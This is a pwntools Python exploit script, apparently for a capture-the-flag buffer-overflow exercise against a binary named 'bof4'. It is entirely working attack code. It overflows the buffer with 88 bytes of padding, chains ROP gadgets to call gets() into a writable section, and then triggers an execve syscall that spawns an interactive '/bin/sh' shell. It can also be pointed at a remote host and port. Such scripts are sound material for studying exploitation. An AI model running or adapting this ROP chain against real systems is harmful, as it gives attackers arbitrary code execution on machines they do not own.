from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./bof4"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

padding = 88

pop_rdi = p64(0x000000000040220e)
pop_rsi = p64(0x00000000004015ae)
pop_rdx = p64(0x00000000004043e4)
pop_rax = p64(0x0000000000401001)
syscall = p64(0x000000000040132e)
rw_section = p64(0x406e00)

payload = flat(
    b"A"*padding,
    pop_rdi,
    rw_section,
    p64(elf.sym.gets),
    pop_rdi,
    rw_section,
    pop_rsi,
    p64(0),
    pop_rdx,
    p64(0),
    b"A"*0x28,
    pop_rax,
    p64(59),
    syscall
)

# write('payload', payload)

io.sendlineafter(b": ",payload)
io.sendline(b"/bin/sh")

io.interactive()